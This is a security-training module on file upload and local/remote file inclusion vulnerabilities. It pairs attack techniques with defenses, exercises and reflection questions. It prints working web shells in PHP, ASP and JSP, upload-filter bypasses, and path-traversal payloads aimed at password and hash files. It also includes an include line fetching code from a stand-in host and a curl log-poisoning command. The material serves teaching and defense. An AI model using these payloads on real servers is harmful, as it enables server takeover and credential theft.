# File Upload and File Inclusion Vulnerabilities

## 1. Orientation

### What this module covers
This module covers two related vulnerability classes that often lead to Remote Code Execution (RCE): unrestricted file upload and file inclusion (LFI/RFI). These are among the most critical web vulnerabilities.

### Fit in the Learning Path
File upload and inclusion vulnerabilities are "shell getters"—they frequently lead to complete server compromise. Understanding these attacks is essential for web application security testing.

### Learning Objectives
By the end of this module, you will:
*   Exploit file upload vulnerabilities
*   Understand LFI and RFI attacks
*   Chain inclusion vulnerabilities to RCE
*   Implement secure file handling

---

## 2. Core Content

### Mental Model: The Trojan Horse

**How professionals think about this:**
File upload vulnerabilities let you smuggle malicious code onto a server—like a Trojan Horse. File inclusion vulnerabilities let you make the server execute files it shouldn't—opening doors that should stay closed.

```
FILE UPLOAD ATTACK FLOW:

INTENDED USE:
┌─────────────────────────────────────────────────────────────────────┐
│                                                                     │
│  User uploads: profile.jpg                                         │
│  Server stores: /uploads/profile.jpg                               │
│  Server serves: <img src="/uploads/profile.jpg">                   │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘

ATTACK:
┌─────────────────────────────────────────────────────────────────────┐
│                                                                     │
│  Attacker uploads: shell.php                                       │
│  (disguised or not)                                                │
│  Server stores: /uploads/shell.php                                │
│  Attacker visits: site.com/uploads/shell.php                      │
│  → PHP executes → Attacker has shell                              │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

### File Upload Vulnerabilities

**Attack vectors:**

```
FILE UPLOAD ATTACKS:

1. DIRECT UPLOAD
   ─────────────────────────────
   Upload .php, .asp, .jsp directly
   If server executes, you have RCE
   
   shell.php:
   <?php system($_GET['cmd']); ?>
   
   Access: /uploads/shell.php?cmd=whoami

2. EXTENSION BYPASS
   ─────────────────────────────
   Server checks extension, but poorly
   
   Bypasses:
   - shell.php.jpg (double extension)
   - shell.pHp (case variation)
   - shell.php5, shell.phtml (alt extensions)
   - shell.php%00.jpg (null byte - old PHP)
   - shell.php;.jpg (semicolon)

3. CONTENT-TYPE BYPASS
   ─────────────────────────────
   Server checks Content-Type header
   
   Bypass: Set Content-Type: image/jpeg
           But send PHP code

4. MAGIC BYTES BYPASS
   ─────────────────────────────
   Server checks file magic bytes
   
   Bypass: Add JPEG magic bytes before PHP
   GIF89a<?php system($_GET['cmd']); ?>
   (GIF89a is GIF magic byte)

5. .HTACCESS UPLOAD
   ─────────────────────────────
   If you can upload .htaccess:
   
   AddType application/x-httpd-php .jpg
   
   Now all .jpg files execute as PHP
```

**Web shell examples:**

```
WEB SHELLS:

PHP (Simple):
<?php system($_GET['cmd']); ?>

PHP (Eval):
<?php eval($_POST['code']); ?>

PHP (Hidden in image):
GIF89a<?php @eval($_REQUEST['c']); ?>

ASP:
<%eval request("cmd")%>

JSP:
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>

POPULAR SHELLS:
- p0wny-shell
- c99
- b374k
- PentestMonkey reverse shell
```

### File Inclusion Vulnerabilities

**LFI and RFI:**

```
FILE INCLUSION CONCEPT:

VULNERABLE CODE:
─────────────────────────────
<?php
$page = $_GET['page'];
include($page . ".php");
?>

INTENDED USE:
site.com/index.php?page=about
→ includes "about.php"

LOCAL FILE INCLUSION (LFI):
─────────────────────────────
site.com/index.php?page=../../../../etc/passwd
→ includes "/etc/passwd"

Path traversal with ../

Common targets:
- /etc/passwd (Linux user list)
- /etc/shadow (password hashes, need root)
- /proc/self/environ (environment variables)
- /var/log/apache2/access.log (log poisoning)
- C:\Windows\win.ini (Windows)
- C:\Windows\System32\config\SAM (Windows hashes)

REMOTE FILE INCLUSION (RFI):
─────────────────────────────
site.com/index.php?page=http://evil.com/shell
→ includes remote PHP from attacker server

Requires: allow_url_include = On (rare now)
```

### LFI Bypass Techniques

**Evading filters:**

```
LFI BYPASSES:

1. NULL BYTE (Old PHP < 5.3)
   ─────────────────────────────
   page=../../../../etc/passwd%00
   Terminates string before .php appended

2. PATH TRUNCATION
   ─────────────────────────────
   Very long path + . characters
   page=../../../../etc/passwd............[1000 chars]
   Truncates to allowed length

3. DOUBLE ENCODING
   ─────────────────────────────
   ../ = %2e%2e%2f
   Double: %252e%252e%252f
   
4. FILTER BYPASS
   ─────────────────────────────
   If ../ stripped: ....//....//etc/passwd
   After strip: ../../etc/passwd

5. WRAPPER ABUSE
   ─────────────────────────────
   php://filter/convert.base64-encode/resource=index.php
   Returns source code, not execution
   
   php://input (POST body as include)
   data://text/plain,<?php system('id'); ?>
   
   expect://id (if expect wrapper enabled)
```

### LFI to RCE

**Escalating inclusion to execution:**

```
LFI TO RCE TECHNIQUES:

1. LOG POISONING
   ─────────────────────────────
   Step 1: Inject PHP in logs
   curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/
   
   Step 2: Include the log
   page=../../../../var/log/apache2/access.log&cmd=id
   
   Log files:
   /var/log/apache2/access.log
   /var/log/apache2/error.log
   /var/log/nginx/access.log
   /var/log/auth.log
   /var/log/mail.log
   /var/log/sshd.log
   /proc/self/fd/0-10 (file descriptors)

2. SESSION POISONING
   ─────────────────────────────
   Step 1: Set session variable with PHP
   (Login form or other input saved to session)
   
   Step 2: Include session file
   /tmp/sess_[PHPSESSID]
   /var/lib/php/sessions/sess_[PHPSESSID]

3. /PROC/SELF/ENVIRON
   ─────────────────────────────
   User-Agent is in environment
   Send PHP in User-Agent
   Include /proc/self/environ

4. PHP FILTER CHAIN
   ─────────────────────────────
   Advanced technique using filter wrappers
   Chain multiple conversions to generate PHP
   php://filter/convert.iconv.../resource=php://temp
   
5. SMTP LOG
   ─────────────────────────────
   Send email to server with PHP in headers
   Include /var/log/mail.log
```

### Defense Strategies

**Preventing file attacks:**

```
FILE UPLOAD DEFENSES:

1. WHITELIST EXTENSIONS
   ─────────────────────────────
   Only allow: .jpg, .png, .pdf
   Reject everything else
   Check after all processing (not just extension)

2. RENAME UPLOADED FILES
   ─────────────────────────────
   User uploads: profile.jpg
   Store as: 8f3a91b2c4d5e6f7.jpg
   Prevents execution by hiding extension choice

3. SEPARATE STORAGE
   ─────────────────────────────
   Store outside webroot
   Or on separate domain (CDN/S3)
   Prevents direct access/execution

4. DISABLE EXECUTION
   ─────────────────────────────
   In upload directory .htaccess:
   php_flag engine off
   
   Or nginx: location ~ /uploads { deny all; }

5. VALIDATE CONTENT
   ─────────────────────────────
   Check magic bytes AND extension
   Reprocess images (strip metadata)
   Scan for malware

FILE INCLUSION DEFENSES:

1. WHITELIST INPUTS
   ─────────────────────────────
   Don't use user input for includes
   $allowed = ['home', 'about', 'contact'];
   if (in_array($page, $allowed)) { include $page; }

2. SANITIZE PATHS
   ─────────────────────────────
   Remove ../, ./
   Use basename() to get filename only
   Use realpath() and compare to allowed directory

3. DISABLE URL INCLUDE
   ─────────────────────────────
   php.ini: allow_url_include = Off
   (Default in modern PHP)

4. RESTRICT PERMISSIONS
   ─────────────────────────────
   Web user shouldn't read /etc/shadow
   Proper file permissions limit impact
```

---

## 3. Guided Practice

### Exercise 1: File Upload Testing

For an upload feature, test:

| Test | Payload | Expected Result |
|------|---------|-----------------|
| Direct PHP | shell.php | ___ |
| Double extension | shell.php.jpg | ___ |
| Case bypass | shell.pHP | ___ |
| Content-Type | PHP with image/jpeg | ___ |

### Exercise 2: LFI Testing

For parameter `?page=home`:

| Test | Payload | Purpose |
|------|---------|---------|
| Basic traversal | `../../../../etc/passwd` | ___ |
| Null byte | `../../../../etc/passwd%00` | ___ |
| PHP filter | `php://filter/convert.base64-encode/resource=index` | ___ |

### Exercise 3: LFI Chain

You have LFI that only allows .log files. How would you get RCE?

1. Which log would you target? ___
2. How would you inject PHP? ___
3. What's your include path? ___

---

## 4. Reflection Check

### Attack Understanding
1. Server only allows .jpg. How would you attempt upload bypass?

2. LFI exists but no logs are readable. Other paths to RCE?

3. Server renames files to UUID. Impact on upload attack?

### Defense Thinking
1. Why store uploads on S3 instead of application server?

2. Application needs dynamic includes. What's the safe approach?

3. Team wants to allow PDF uploads. Security checklist?

---

## 5. Key Misconceptions

**MYTH: "Checking extension prevents upload attacks"**
REALITY: Extension can be bypassed via double extension, null byte, or MIME confusion.

**MYTH: "LFI only reads files"**
REALITY: LFI often chains to RCE via log poisoning, wrappers, or session files.

**MYTH: "RFI is required for RCE from inclusion"**
REALITY: LFI + log poisoning or wrappers can achieve RCE without remote include.

**MYTH: "Uploads in separate folder are safe"**
REALITY: If the folder is web-accessible and executable, payload can run.

**MYTH: "Modern frameworks are immune"**
REALITY: Misconfigurations or custom code can still introduce these vulnerabilities.

---

## 6. Completion Criteria

This module is complete when you can:

1. **Identify** file upload vulnerabilities
2. **Bypass** common upload restrictions
3. **Exploit** LFI and RFI vulnerabilities
4. **Chain** LFI to RCE via log poisoning
5. **Implement** secure file handling defenses

---

## 7. Further Depth (Optional)

*   **Practice:** PortSwigger File Upload labs
*   **Tool:** Upload scanner tools (Fuxploider)
*   **Research:** PHP filter chain RCE technique
*   **Lab:** Practice log poisoning in isolated environment
